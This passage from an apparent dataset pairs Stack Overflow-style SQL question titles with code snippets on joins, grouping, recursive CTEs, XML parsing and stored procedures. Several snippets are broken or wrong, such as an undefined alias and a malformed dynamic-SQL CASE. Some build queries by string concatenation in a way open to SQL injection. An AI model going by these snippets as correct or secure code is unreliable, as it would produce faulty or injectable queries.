  JOIN ADDRESS a ON a.name_id = t.name_id
  JOIN (SELECT n.last_name
          FROM NAME n
      GROUP BY n.last_name
        HAVING COUNT(*) > 1) nn ON nn.last_name = t.last_name
"
21349,52210,Sql Query to get Data based on Current Date,"select * into #temp from 
dbo.fnDashboard_DummyWeekly1(
dateadd(day, datediff(day, 0, '5/28/2014'), 0),
convert(date,getdate())
)
"
12119,54669,Count the ratings of each child element under each parent in SQL,"SELECT ParentID, 
       COUNT(CASE WHEN Rating = 'A' THEN 1 END) AS A,
       COUNT(CASE WHEN Rating = 'B' THEN 1 END) AS B,
       COUNT(CASE WHEN Rating = 'C' THEN 1 END) AS C
FROM mytable
WHERE ParentID IS NOT NULL
GROUP BY ParentID
"
14686,24849,How to have multiple tables with multiple joins,"SELECT 
*
FROM Staff, MobileRights
LEFT OUTER JOIN StaffMobileRights ON StaffMobileRights.StaffId = Staff.Id
"
12765,22821,Multiple Counts in one Select Statement using Joins?,"SELECT Table.Name, (SELECT Count(Active) FROM Table2) 
FROM Table
 LEFT JOIN Table2 ON Table2.Active = 1
"
19537,30699,When would you INNER JOIN a LEFT JOINed table /,"SELECT StaffGroup.*
FROM StaffGroup
LEFT OUTER JOIN 
  (SELECT * FROM StaffByGroup 
   INNER JOIN StaffMember 
   ON StaffMember.StaffMemberId = StaffByGroup.StaffMemberId) StaffByGroup
ON StaffByGroup.StaffGroupId = StaffGroup.StaffGroupId
WHERE StaffByGroup.StaffGroupId IS NULL
"
28587,73579,"Correct way to use ""NOT IN"" Postgres","  Select distinct People.id 
  From People 
  LEFT JOIN Vehicles on        People.id=Vehicles.person_id 
  where Vehicles.person_id is NULL
"
17590,20043,Increment row depending on value of another column,"row_number() over (order by YEAR(TourTbl.DT_Started) asc,
                            MONTH(TourTbl.DT_Started) asc ) +
min(YEAR(TourTbl.DT_Started)*12+MONTH(TourTbl.DT_Started)-1) OVER () % 12 as Row 
"
37435,38932,"How to parse a string to a date, when the string has a character in it?","select to_date( '2015-07-09T12:22:29', 'YYYY-MM-DD""T""HH:MI:SS' ) from dual;

TO_DATE('
---------
09-JUL-15
"
23747,7027,"Sql server rtrim not working for me, suggestions?","DECLARE @str VARCHAR(MAX)
SELECT @str = COALESCE(@str+',' ,'') + LTRIM(RTRIM((p.Symbol)))
FROM tblDailyPricingAndVol p
WHERE p.Volume > 1000000 and p.Clse <= 40 and p.TradeDate = @maxDate
ORDER by p.Symbol
SELECT @str
GO
"
15623,10398,Show the specific field on mysql table based on active date,"SELECT trx.TrxID, trx.TrxDate, uh.UsrName, ud.UsrLoc
FROM trx 
     INNER JOIN UsrDetail ud ON (trx.UsrId = ud.UsrId)
     INNER JOIN UsrHeader uh ON (trx.UsrId = uh.UsrId)
WHERE ud.Date = (SELECT MAX(t.Date)
                 FROM UsrDetail t
                 WHERE t.UsrId = trx.UsrId
                   AND t.Date <= trx.TrxDate)
"
16056,50947,SQL joining tables based on IDs,"select ti.title_name, te.team_name
from link l
inner join title ti on l.title_id = ti.title_id
inner join team te on l.team_id = te.team_id
"
32894,29780,change timestamps from mysql format to unix - MYSQL,"UPDATE table
SET
   newDateColumn = UNIX_TIMESTAMP(oldDateColumn)
"
31778,15828,optimizing mysql query with nested subqueries,"SELECT ProductItemID, SUM(RulePrice * ItemQuantity) AS TotalPrice FROM
(SELECT p.ProductItemID, k.RuleID, p_count, COUNT(k.RuleID) AS k_count,
RulePrice, ItemQuantity
FROM productitems
INNER JOIN optionsets o ON productitems.ProductItemID = o.ProductItemID
INNER JOIN (SELECT ProductItemID, COUNT(OptionGroupID) AS p_count 
        FROM optionsets
        GROUP BY ProductItemID) AS p ON p.ProductItemID = o.ProductItemID
LEFT JOIN kitruleoptions k ON k.OptionGroupID = o.OptionGroupID
LEFT JOIN kitrules ON k.RuleID = kitrules.RuleID
WHERE productitems.ProductID = %s
GROUP BY o.ProductItemID, k.RuleID
HAVING k_count = p_count) AS x
GROUP BY x.ProductItemID
"
8983,27988,SQL query for displaying record with maximum number of non-empty fields,"select  top 1 Record_ID
from    YourTable
order by
        case when isnull(col1,'') <> '' then 1 else 0 end +
        case when isnull(col2,'') <> '' then 1 else 0 end +
        case when isnull(col3,'') <> '' then 1 else 0 end +
        ...
        case when isnull(colN,'') <> '' then 1 else 0 end
"
39473,58453,sql server 2008 group_Concat() version BUT in different columns (NOT comma separated),"DECLARE @sql1   VARCHAR(4000) = ''
DECLARE @sql2   VARCHAR(4000) = ''
DECLARE @sql3   VARCHAR(4000) = ''

SELECT @sql1 = 
'SELECT
    r.REQUEST_ID' + CHAR(10)

SELECT @sql2 = @sql2 +
'   , [' + a.NAME + '] = MAX(CASE WHEN a.APPROVER_ID = ' + CONVERT(VARCHAR(10), a.APPROVER_ID) + ' THEN a.NAME END)' + CHAR(10)
FROM (
    SELECT * FROM TRK_APPROVER
)a
ORDER BY a.APPROVER_ID

SELECT @sql3 = 
'FROM TRK_REQUEST r
INNER JOIN TRK_APPROVER a
    ON a.APPROVER_ID = r.APPROVER_ID
GROUP BY r.REQUEST_ID
ORDER BY r.REQUEST_ID
'

PRINT (@sql1 + @sql2 + @sql3)
EXEC (@sql1 + @sql2 + @sql3)
"
35588,73294,How to select within the closest thing to Y in SAS as a starting point,"SELECT PROPERTY, START_DATE, END_DATE, DAY_OF_WEEK, MARKET_CODE_PREFIX, RATE_PGM, ROOM_POOL, QUOTE_SERIES_NO, QUOTE_POSITION
FROM Sbtddraf.Vssmauditdraftfull AS t
--   group by Property, RATE_PGM
WHERE START_DATE =
  ( select MAX(START_DATE)
    FROM Sbtddraf.Vssmauditdraftfull AS t2
    where t1.Property = t2.Property
      and t1.RATE_PGM = t2.RATE_PGM
  )
"
9583,46604,"LIKE operator on timestamp column, SQL Server","DECLARE @string_to_like varchar(18) = '0x000000000000E05'

DECLARE @chars_to_like int
SELECT @chars_to_like = 18 - len(@string_to_like)

DECLARE @min_rowversion_s varchar(18)
SET @min_rowversion_s =  left(ltrim(@string_to_like) + '00000000000000000', 18)

DECLARE @min_rowversion varbinary(8)
SET @min_rowversion = CONVERT(varbinary(8), @min_rowversion_s, 1) 

DECLARE @max_value  INT
DECLARE @divider int

SET @divider = POWER(16, @chars_to_like)

SELECT @max_value = @min_rowversion + @divider - 1

SELECT * FROM TAB WHERE tRowVersion BETWEEN @min_rowversion AND @max_value
"
37728,59537,update query date function,"select 'update organizations set createddate='''
                                             ^^ here
"
30177,39994,SQL Server - Select data from one table based on a string value,"select M.ManufacturerID, P.ManufacturerName, M.CategoryID
from Manufacturers M
left join Parameters P On P.CategoryID = M.CategoryID AND (P.PriceFrom <= M.BasePrice AND P.PriceTo >= M.BasePrice)
"
12561,19092,Reversing a 'With Recursive' statement,"WITH RECURSIVE emptree AS (
         SELECT e.win_id,
            e.full_name,
            e.current_sup_name,
            e.sbu,
            e.cost_center,
            e.lob,
            0 AS depth
           FROM app_reports.vw_hiearchy e
          WHERE e.win_id = xxxxxxx AND e.attrition_date IS NULL
        UNION ALL
         SELECT e.win_id,
            e.full_name,
            concat_ws(',', e.current_sup_name, t.current_sup_name) current_sup_name,
            e.sbu,
            e.cost_center,
            e.lob,
            t.depth + 1 AS depth
           FROM app_reports.vw_hiearchy e
             JOIN emptree t ON t.win_id = e.current_sup_win
          WHERE e.attrition_date IS NULL
        )
 SELECT emptree.win_id,
    emptree.full_name,
    emptree.current_sup_name,
    emptree.sbu,
    emptree.cost_center,
    emptree.lob,
    emptree.depth
   FROM emptree;
"
23993,43971,How select XML fields node for all rows," SELECT 
     Year,
     E.P.value('(ID)[1]', 'INT') AS 'ID',
     E.P.value('(Name)[1]', 'VARCHAR(50)') AS 'Name',
     E.P.value('(LastName)[1]', 'VARCHAR(50)') AS 'LastName'
 FROM 
     dbo.YourTable 
 CROSS APPLY
     Fields.nodes('/Employees/Person') AS E(P)
"
31691,3904,SQL Server 2005 WHERE Clause with like condition,"declare @sql varchar(1024)
declare @where varchar(1024)
set @sql = N'SELECT field1, field2, field3 FROM myTable'
set @where = N' WHERE columnName like '%'+ product.Status + '%''
case when @param = 1 then concat(@sql,@where)
execute sp_executesql @sql
"
11451,34043,T-SQL Azure Stream Analytics Rounding to Minute,"SELECT DATEADD(mi, 
  DATEDIFF(mi, CAST('1900-01-01 00:00:00.000' AS DateTime), 
    DATEADD(s, 30, MAX(timecreated))),
  CAST('1900-01-01 00:00:00.000' AS DateTime)) as 'timestamp'
"
36817,34614,How do I convert this to use JOINS?,"SELECT  *
FROM    jobs j
JOIN    advertisers a 
ON      a.advertiser_id = j.advertiser_id
"
4344,7998,Collating data in SQL Server,"      SELECT SUM(COL1) , SUM(COL2)..... FROM tbl GROUP BY ST
"
4899,66120,Mysql returns zero rows if second table has no matches,"SELECT u.user_id, u.user_name,
       GROUP_CONCAT(uc.course_id SEPARATOR ',') AS course_ids
FROM user u LEFT JOIN
     user_courses uc 
     ON u.user_id_id = uc.user_id
GROUP BY u.user_id;
"
35904,29471,How to split one column into two columns just by counting the charachters and inserting them into another table via a SQL query?,"insert into table2
select left(column1,2), substring(column1, 3, len(column1) ) from table1
"
27345,5587,DB2: Get biggest tables and check if column exists in these tables (one query),"Select 
 t.TABNAME,
 t.NPAGES,
 case 
   when 
     exists (select 1 
             from syscat.columns as c 
             where c.TABNAME = t.TABNAME 
             and c.TABSCHEMA = t.TABSCHEMA 
             and c.colname = 'LOGSYS')
     then 1
   else 0
 end
from SYSCAT.TABLES as t 
WHERE 
  t.TABSCHEMA = 'OWN' 
order by t.NPAGES DESC 
FETCH FIRST 3 ROWS ONLY
"
34449,24905,Symfony query on intermediate table,"$id = 1; // Your event id

$repository = $this->getDoctrine()
    ->getRepository('AcmeDemoBundle:Entity');

$query = $repository->createQueryBuilder('g')
    ->select('e')
    ->leftJoin('g.events', 'e', 'WITH', 'e.id = :id')
    ->setParameter('id', $id)
    ->getQuery();

$events = $query->getResult();
"
11222,6141,programmatically create new table with ios-core data,"Entity descriptions are editable until they are used by an object graph manager. This
allows you to create or modify them dynamically. However, once a description is used 
(when the managed object model to which it belongs is associated with a persistent store
coordinator), it must not (indeed cannot) be changed. This is enforced at runtime: any
attempt to mutate a model or any of its sub-objects after the model is associated with a 
persistent store coordinator causes an exception to be thrown. If you need to modify a
model that is in use, create a copy, modify the copy, and then discard the objects with
the old model.
"
27827,71979,"In SQL, how can I perform a ""subtraction"" operation?","select id from table1 where id not in (select id from table2)
"
438,63879,Create one single query from 2 queries,"SELECT 
  COUNT(*) AS cnt,
  (SELECT 
    COUNT(*) AS cnt2 
  FROM
    tags 
  WHERE filename = t.filename) vcnt,
  video.title 
FROM
  tags t 
  INNER JOIN tag_name 
    ON t.tag_name_id = tag_name.tag_name_id 
  INNER JOIN video 
    ON video.filename = t.filename 
WHERE tag_name.tag LIKE 'tree' 
GROUP BY t.filename 
"
21936,40114,username and password for importing Oracle .dmp file,"impdp system/password@database dumpfile=dump.dmp directory=directory remap_schema=from:to remap_tablespace=from:to
"
24358,51948,recursively fill a sql table based on data in the table,"IF EXISTS (SELECT * FROM sys.procedures WHERE Name = 'InsertAppointmentDay' AND [type_desc] = 'SQL_STORED_PROCEDURE')
    DROP PROCEDURE InsertAppointmentDay;
GO

SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
CREATE PROCEDURE [dbo].[InsertAppointmentDay]
    @BACCode char(6)  
    ,@Division varchar(10)
    ,@ScheduleDate date
    ,@StartTime1 time(7)
    ,@EndTime1 time(7)
    ,@StartTime2 time(7)
    ,@EndTime2 time(7)   
    ,@TimeZoneAbbreviation char(6)   
AS
BEGIN  
    DECLARE @IntervalMinutes INT 
    DECLARE @AppointmentsPerInterval INT 
    DECLARE @ErrorMessage NVARCHAR(4000) ;
    DECLARE @ErrorState INT  ;

    -- make sure the dealer does not already have records in the schedule table for that day. We want to make sure if you already have appointments for that day 
    if   exists  (select Id from Schedule where   DealerDivision = @Division and DealerBACCode = @BACCode and AppointmentDay = @ScheduleDate)
    begin
        set @ErrorMessage = 'a record already exist in schedule table with DealerDivision = '+@Division+' and DealerBACCode = '+@BACCode+' and AppointmentDay = '+CAST(@ScheduleDate as varchar(20)); 
        RAISERROR (@ErrorMessage,  16,  @ErrorState );
        Return;
    end 

    BEGIN TRY 
        BEGIN TRANSACTION 
            DECLARE @ZipOffset char(6);

            SELECT @ZipOffset = [TimeZoneOffset]  FROM [TimeZone]   WHERE [TimeZoneAbbreviation] = @TimeZoneAbbreviation;

            -- find out from the frequency table how many minutes are in the interval and how many appointments per interval. look it up by FrequencyCode in the Frequency table 
            select @IntervalMinutes = IntervalMinutes, @AppointmentsPerInterval= AppointmentsPerInterval 
                from   Frequency where Code = (select top 1 AppointmentCode from Dealer where  Division = @Division and BACCode = @BACCode) 


            -- @Intervals table is a temp table with all the possiable timeslots we will add (a morning section and an afternoon section)
            -- example. if the location is open from 10:00 to 11:00 lunch then 13:00 to 15:00 the and the interval is 60 minutes you will get
            -- 10:00   
            -- 11:00 
            -- 13:00
            -- 14:00
            -- 15:00 
            DECLARE @Intervals table    (   [Time] TIME   UNIQUE ([Time])) 

            if (@StartTime2 is null)
            begin
                ;WITH AmSlots([TimeSlot] ) AS 
                ( 
                        SELECT @StartTime1   UNION ALL 
                        SELECT 
                        [TimeSlot] = DATEADD(mi, @IntervalMinutes, [TimeSlot]) 
                        FROM AmSlots WHERE DATEADD(mi, @IntervalMinutes, [TimeSlot]) <=  @EndTime1
                ) 
                insert into @Intervals select [TimeSlot] from [AmSlots]  
            end
            else 
            begin
                print 'pm times'
                ;WITH AmSlots([TimeSlot] ) AS 
                ( 
                        SELECT @StartTime1   UNION ALL 
                        SELECT 
                        [TimeSlot] = DATEADD(mi, @IntervalMinutes, [TimeSlot]) 
                        FROM AmSlots WHERE DATEADD(mi, @IntervalMinutes, [TimeSlot]) <=  @EndTime1
                ) ,PmSlots([TimeSlot] ) AS 
                (  
                        SELECT @StartTime2    UNION ALL
                        SELECT 
                        [TimeSlot] = DATEADD(mi, @IntervalMinutes, [TimeSlot])  
                        FROM PmSlots WHERE DATEADD(mi, @IntervalMinutes, [TimeSlot]) <=  @EndTime2  
                ) 
                insert into @Intervals select [TimeSlot] from [AmSlots] union all select [TimeSlot] from [PmSlots] 
            end


            -- @DayAppointments is a table to store the combination of time slots with the Number of appointments per interval
            -- example if the location is open from 10:00 to 11:00 lunch then 13:00 to 14:00 the and the interval = 60 minutes and the AppointmentsPerInterval = 3 you will get
            -- 1 | 10:00   
            -- 2 | 10:00   
            -- 3 | 10:00   
            -- 1 | 11:00   
            -- 2 | 11:00   
            -- 3 | 11:00   
            -- 1 | 13:00   
            -- 2 | 13:00   
            -- 3 | 13:00   
            -- 1 | 14:00   
            -- 2 | 14:00   
            -- 3 | 14:00   
            DECLARE @DayAppointments TABLE 
            (
                [AppointmentNumberForTimeSlot] INT,
                [Time] TIME
                UNIQUE ([AppointmentNumberForTimeSlot],[Time])
            )
            -- Quanity is a sequence table (if @AppointmentsPerInterval = 3   Quanity will contain  1, 2, 3) used to cross join with @Intervals to get the @DayAppointments
            ;WITH Quanity([AppointmentNumberForTimeSlot] ) AS
            (
                    SELECT 1 UNION ALL
                    SELECT  [AppointmentNumberForTimeSlot] = [AppointmentNumberForTimeSlot] + 1  FROM Quanity WHERE [AppointmentNumberForTimeSlot]  <   @AppointmentsPerInterval
            ) 
            insert into @DayAppointments select [AppointmentNumberForTimeSlot], [Time] from Quanity cross join @Intervals 

            --select * from  @DayAppointments   

            -- insert one record into Schedule for each record in @DayAppointments 
            INSERT INTO [Schedule]  ([DealerBACCode],[DealerDivision],[AppointmentDay],[AppointmentTime], [ZipOffset], [TimeZoneAbbreviation], [ModifiedBy])
                select  @BACCode , @Division ,@ScheduleDate ,[Time]  , @ZipOffset , @TimeZoneAbbreviation , 'InsertAppointmentDay' from  @DayAppointments  where [Time] IS NOT NULL 
            print 'about to compelte transaction'
         COMMIT TRANSACTION
    END TRY
    BEGIN CATCH 
        print 'about to Rollback transaction'
        Rollback Transaction  
        set @ErrorMessage  = ERROR_MESSAGE()
        set @ErrorState   = ERROR_STATE() 
        RAISERROR (@ErrorMessage, 16, @ErrorState);
        Return;
    END CATCH;  
END 
"
16705,20092,SQL: Access query unique meets multiple criterias,"SELECT DISTINCT studentID FROM attendant
WHERE studentID NOT IN
(SELECT DISTINCT studentID FROM attendant
WHERE Startdatum BETWEEN #1/1/2010# AND #12/31/2010#)
"
36950,72988,How to join two tables in an UPDATE statement?,"UPDATE tweets JOIN users ON tweets.user_id = users.user_id
  SET tweets.spam = 1
WHERE users.name = 'SUSPENDED'
"
32482,75466,GROUP BY next months over N years,"SELECT
  FLOOR(
      (EXTRACT(EPOCH FROM date) - EXTRACT(EPOCH FROM now()))
        / EXTRACT(EPOCH FROM INTERVAL '12 month')
    ) + 1 AS ""horizon"",
  SUM(amount) AS ""amount""
FROM dataset 
GROUP BY horizon
ORDER BY horizon;
"
12866,54137,Scrub email address from Mysql,"UPDATE YourTable
    SET EmailColumn = 'xxx' + RIGHT(EmailColumn, LENGTH(EmailColumn) - LOCATE('@', EmailColumn) + 1)
"
4958,16263,How to replace the characters,"UPDATE Table1
SET ID = UPPER(ID)
"
412,9016,"I have include wp-config, should I add global $wpdb also?","function require_wp_db() {
    global $wpdb;

    require_once( ABSPATH . WPINC . '/wp-db.php' );
    if ( file_exists( WP_CONTENT_DIR . '/db.php' ) )
        require_once( WP_CONTENT_DIR . '/db.php' );

    if ( isset( $wpdb ) )
        return;

    $wpdb = new wpdb( DB_USER, DB_PASSWORD, DB_NAME, DB_HOST );
}
"
28523,31500,how to make custom query from multiple tables,"SELECT u.id, u.name, status.status_name 
FROM user u
LEFT JOIN daily_status as ds ON u.id=ds.user_id AND ds.date='24/10/2013'
LEFT JOIN status_types as status ON ds.status_id=status.id
WHERE u.department_id=1
"
23104,34906,Display Table Name in Query Results; SQL Server 2008,"create view v_LOAD_UNISTATS_ACCREDITATION as
    select lua.*, 2013 as year
    from LOAD_UNISTATS_2013_ACCREDITATION lua
    union all
    select lua.*, 2012 as year
    from LOAD_UNISTATS_2012_ACCREDITATION lua
    . . .;
"
16226,23491,SQL - Query Phonenumber that are stored inconsistently,"phonenumber like '%5%5%5%1%2%3%4%5%6%'
"
8774,3650,rename database name - mysql,"/etc/init.d/mysql stop
cd /var/lib/mysql
mv <old db name> <new db name>
/etc/init.d/mysql start
"
27247,16321,Deleting pairwise duplicates in SQL Server,"with todelete as (
      select t.*, row_number() over (partition by ordid, featureid
                                     order by lastmodified desc) as seqnum
      from organization.tag
     )
delete from todelete
    where seqnum > 1;
"
7463,67441,How can I query records depending on value existance?,"SELECT  ID, VALUE, CATEGORY
  FROM  (
      SELECT ID, VALUE, CATEGORY,
          ROW_NUMBER() OVER (PARTITION BY ID) as SEQ_ID
        FROM MY_TABLE
      ORDER BY ID, CATEGORY DESC
  )
 WHERE SEQ_ID = 1
"
13965,23382,Output of parametrized value as table name,"DECLARE @tablevalue nvarchar(max);
DECLARE @sql nvarchar(max);

SELECT @tablevalue  = [Tariff Lookup]
FROM [DaisyBilling].[dbo].[APRW14_FFA68878_Calls];

SELECT @sql = N'UPDATE [APRW14_FFA68878_Calls] 
SET    [APRW14_FFA68878_Calls].[Sell Price] = [test].[dbo].' + @tablevalue +'.[Peak]/60*[APRW14_FFA68878_Calls].[Duration (secs)]
FROM   [Test].[dbo].[DaisyRates_May2014]
INNER JOIN [DaisyBilling].[dbo].[APRW14_FFA68878_Calls] on [DaisyBilling].[dbo].[APRW14_FFA68878_Calls].[ChargeCode] = [Test].[dbo].[DaisyRates_May2014].[Chargecode]';

EXEC sp_executesql @sql;
PRINT @tablevalue;
"
39019,62250,Extracting substring from BLOB converted in VARCHAR2,"select UTL_RAW.CAST_TO_VARCHAR2(DBMS_LOB.SUBSTR(p_targetCarts, 11,60)) 
from {OrderProposal}
"
5129,19223,SQL - Divide a value and make sure it re-sums to original,"IF OBJECT_ID('tempdb..#Temp') IS NOT NULL DROP TABLE #Temp
GO

DECLARE @Total MONEY = 5.13;

;WITH 
SplitData AS 
    (   
        SELECT .03 AS SplitPercent
        UNION
        SELECT .42
        UNION
        SELECT .55 AS SplitPercent
    ),
Percents AS 
    (
    SELECT  S.SplitPercent, 
            @Total AS FullMoneyValue, 
            @Total * S.SplitPercent AS Total,
            ROUND(@Total * S.SplitPercent,3,0) AS RoundedTotal
    FROM SplitData AS S
    )
SELECT  P.*
INTO    #Temp
FROM    Percents AS P

SELECT  SUM(P.Total), ROUND(SUM(P.RoundedTotal),2,0)
FROM    #Temp AS P
"
7390,44640,how to show the value present in table or return null,";with mycte as
  (
   select cast('2011-06-12 00:00:00' as datetime) AS BeginDateValue, 
          dateadd(minute, 15, '2011-06-12 00:00:00') AS EndDateValue
   union all 
   select dateadd(minute, 15, BeginDateValue), 
          dateadd(minute, 15, EndDateValue)
   from mycte 
   where  dateadd(minute, 15, BeginDateValue) <= '2011-06-12 23:59:00'
   )
   SELECT [datetime], feederid, VR,VY,VB,IR,IY,IB,KW,KVA,KVAR,PF1,PF2,PF3,PF
   FROM mycte mc LEFT JOIN pseb.dbo.datasource d 
                   ON CONVERT(datetime, [datetime]) >= BeginDateValue 
                     and CONVERT(datetime, [DATETIME]) < EndDateValue
                 LEFT JOIN pseb.dbo.METERMASTER m ON d.feederid = m.MeterID
"
37035,27309,extracting a value from XML using SQL using Oracle 11g,"SELECT 
  EXTRACTVALUE(XMLType(
     q'[<?xml version=""1.0"" encoding=""utf-8"" ?>
        <string xmlns=""http://someweburl""><SAMP_OVERALL>Y</SAMP_OVERALL></string>]')
, 
'/*[local-name()=""string""]/*[local-name()=""SAMP_OVERALL""]') myval
from dual;
"
4176,68506,GROUP BY and COUNTs not producing expected results,"SELECT maker,
       MAX(type) AS type
FROM   product
GROUP  BY maker
HAVING COUNT(DISTINCT type) = 1
       AND COUNT(model) > 1 
"
13642,67748,"SQL query, a JOIN and a COUNT and a DISTINCT","Select  b.user_login, 
        Count(*) As cnt
From    wp_posts AS a 
Join    wp_users AS b   On  a.post_author = b.ID
Where   a.post_type = 'tee'
Group By b.user_login;
"
19085,23580,Migrate SQL Server DateTime column to DateTimeOffset,"-- up here set the @time_zone variable.

INSERT INTO Table_Temp
    (Col0, ... ColN,)
SELECT 
    COl0, TODATETIMEOFFSET(COLDATE, @time_zone),.... ColN, from 
Table_Original;
"
24037,15399,mysql like groupby in oracle how to,"SQL> ed
Wrote file afiedt.buf

  1  with tab1 as (
  2   select 100 col1, 1 col2, 'Hello' col3,9 col4  from dual
  3   union all
  4   select 200 col1, 1 col2, 'HelloWrld' col3,8 col4  from dual
  5   union all
  6   select 300 col1, 1 col2, 'HelloTher' col3,7 col4  from dual
  7   union all
  8   select 400 col1, 2 col2, 'HiThere' col3,6 col4  from dual
  9   union all
 10   select 500 col1, 3 col2, 'Howdy' col3,5 col4  from dual
 11   union all
 12   select 600 col1, 3 col2, 'Hiya' col3,4 col4  from dual
 13   )
 14  select col1,
 15         col2,
 16         col3,
 17         col4,
 18         min_col4
 19    from (select col1,
 20                 col2,
 21                 col3,
 22                 col4,
 23                 min(col4) over (partition by col2) min_col4,
 24                 rank() over (partition by col2 order by col1) rnk
 25            from tab1)
 26*  where rnk = 1
SQL> /

      COL1       COL2 COL3            COL4   MIN_COL4
---------- ---------- --------- ---------- ----------
       100          1 Hello              9          7
       400          2 HiThere            6          6
       500          3 Howdy              5          4
"
33330,5078,DAO Recordset with SQL Statement to Add Records with For Next Loop,"If rrow = 1 then
    DoCmd.RunSQL ""SELECT [Oracle JE].* INTO Unmatched FROM [Oracle JE] 
    WHERE [Oracle JE].[Account Code]="" & start 
Else
    DoCmd.RunSQL ""INSERT INTO Unmatched SELECT [Oracle JE].* FROM [Oracle JE] 
    WHERE [Oracle JE].[Account Code]="" & start 
End
"
21235,26225,Insert XML Node into a SQL column in a table,"DECLARE @XmlData XML
Set @XmlData = '<vehicles> 
  <vehicle>
    <vehiclereg>AB12CBE</vehiclereg>
    <anotherprop>BLAH</anotherprop>
  </vehicle>
  <vehicle>
    <vehiclereg>AB12CBE</vehiclereg>
    <anotherprop>BLAH</anotherprop>
  </vehicle>
</vehicles>'
SELECT T.Vehicle.value('./vehiclereg[1]', 'NVARCHAR(10)') AS vehiclereg,
       T.Vehicle.query('.'),
       GETDATE()
FROM @XmlData.nodes('/vehicles/vehicle') AS T(Vehicle)
"
34901,16044,Search mysql with two search terms,"SELECT * FROM isc_products 
WHERE prodname LIKE '%fire%' 
AND prodname LIKE '%poi%' LIMIT 100
"
14250,24203,Update only the top 1 row in sql server,";With cte As
(Select *, Row_Number() Over(Partition By OfficeID order by RowID) As rn
From Employee)

update cte set OfficeBudge = 0 where rn>1

select * from Employee
"
26596,57438,Query Optimization for Combination Calculation,"WITH table1WithIds AS (
    SELECT ROW_NUMBER() OVER (ORDER BY name1, name2, name3) [RowId], name1, name2, name3
    FROM table1
)
, namesRelational AS (
    SELECT RowId, name1 [name] FROM table1WithIds
    UNION
    SELECT RowId, name2 [name] FROM table1WithIds
    UNION
    SELECT RowId, name3 [name] FROM table1WithIds
)
SELECT t1.name1, t1.name2, t1.name3, SUM(t2.score)
FROM namesRelational nr
INNER JOIN table2 t2 ON t2.name = nr.name
INNER JOIN table1WithIds t1 ON t1.RowId = nr.RowId
GROUP BY t1.name1, t1.name2, t1.name3
"
35440,6343,mySQL Query - select join if latest record in join table contains a specific value,"SELECT activity.id AS activityid
    , activity.type
    , activity.date
    , clients.id AS clientid
    , clients.name
FROM activity
LEFT JOIN activity AS other_activities
  ON activity.ClientID  = other_activities.ClientID
    AND activity.date < other_activities.date
LEFT JOIN clients
  ON activity.ClientID = clients.id
WHERE activity.type = 500
  AND other_activities.ClientID IS NULL;
"
29658,58498,MySQL multiple values on own columns,"SELECT MIN(id1) AS id1_a
     , MAX(id1) AS id1_b
     , id2
FROM tableX
GROUP BY id2 ;
"
16389,62451,Sql minus with joins,"with mf as (
      select Message_id,field_id from DB1.MESSAGE_FIELDS a
      minus
      select Message_id,field_id from DB2.MESSAGE_FIELDS
     )
select mf.*, m.name
from mf join
     messages m
     on mf.message_id = m.message_id;
"
32495,43079,How to remove the duplicate record in oracle query,"  with Table1 as (
           select 123 id, 1010 code_id from dual union all
           select 234 id, 1415 code_id from dual 
           ),
        Table2 as (
           select 123 id, 9  state, 1010 code_id from dual union all
           select 123 id, 13 state, 1010 code_id from dual union all
           select 234 id, 20 state, 1415 code_id from dual union all
           select 234 id, 20 state, 1415 code_id from dual union all
           select 234 id, 20 state, 1410 code_id from dual union all
           select 234 id, 30 state, 1410 code_id from dual 
           ),
     w_sub as (
        select a.id aid, b.ID  bid, b.STATE, b.CODE_ID,
              count(a.id) over (partition by b.id) chk,
              count(*) over (partition by b.id) chkt
        from Table2 b
           left outer join
              Table1 a
              on a.ID = b.ID 
              and a.CODE_ID = b.CODE_ID
        )
  select bid  id, state, code_id
    from w_sub
   where chk = chkt
  /

          ID      STATE    CODE_ID
  ---------- ---------- ----------
         123         13       1010
         123          9       1010
"
20995,38058,"I am inserting excel sheet bulk data into a sql database table, now i need to split the table into multiple tables by using stored procedure","Assumptions :
- Column names with prefix myaccount_ belongs to myaccount table
- Column names with prefix business_setup belongs to business_setup table
- Column names with prefix business_info belongs to business_info table
- complete data from  [bulk_data] needs to be dump in to above tables 


Limitations:
- please don't forget to include not-null columns of tables in select list 
- handle foreign key columns (if exists) by yourself

-- EXEC Data_Migration
    CREATE PROCEDURE Data_Migration
AS
BEGIN
    /* before you execute this, make sure to include all not null column names in select list */
    INSERT INTO myaccount ([myaccount_firstname] ,
        [myaccount_lastname] ,
        [myaccount_email] ,
        [myaccount_mobile_no] ,
        [myaccount_workphone] ,
        [myaccount_street_1] ,
        [myaccount_street_2] ,
        [myaccount_city] ,
        [myaccount_state] ,
        [myaccount_zipcode] ,
        [myaccount_country])
    SELECT
        [myaccount_firstname] ,
        [myaccount_lastname] ,
        [myaccount_email] ,
        [myaccount_mobile_no] ,
        [myaccount_workphone] ,
        [myaccount_street_1] ,
        [myaccount_street_2] ,
        [myaccount_city] ,
        [myaccount_state] ,
        [myaccount_zipcode] ,
        [myaccount_country]
    FROM [bulk_data]


    /*  before you execute this, make sure to include all not null column names in select list      */
    INSERT INTO business_setup ([business_setup_business_name] ,
        [business_setup_fein_reg_id] ,
        [business_setup_duns] ,
        [business_setup_street_1] ,
        [business_setup_street_2] ,
        [business_setup_city] ,
        [business_setup_state] ,
        [business_setup_zipcode] ,
        [business_setup_country] ,
        [business_setup_businessphone] ,
        [business_setup_businessfax] ,
        [business_setup_emailid] ,
        [business_setup_website] ,
        [business_setup_primary_firstname] ,
        [business_setup_primary_lastname] ,
        [business_setup_primary_email] ,
        [business_setup_primary_mobile] ,
        [business_setup_primary_workphone] ,
        [business_setup_secondary_firstname] ,
        [business_setup_secondary_lastname] ,
        [business_setup_secondary_email] ,
        [business_setup_secondary_mobile] ,
        [business_setup_secondary_workphone] ,
        [business_setup_pay_via] ,
        [business_setup_paypal_id] ,)
    SELECT
        [business_setup_business_name] ,
        [business_setup_fein_reg_id] ,
        [business_setup_duns] ,
        [business_setup_street_1] ,
        [business_setup_street_2] ,
        [business_setup_city] ,
        [business_setup_state] ,
        [business_setup_zipcode] ,
        [business_setup_country] ,
        [business_setup_businessphone] ,
        [business_setup_businessfax] ,
        [business_setup_emailid] ,
        [business_setup_website] ,
        [business_setup_primary_firstname] ,
        [business_setup_primary_lastname] ,
        [business_setup_primary_email] ,
        [business_setup_primary_mobile] ,
        [business_setup_primary_workphone] ,
        [business_setup_secondary_firstname] ,
        [business_setup_secondary_lastname] ,
        [business_setup_secondary_email] ,
        [business_setup_secondary_mobile] ,
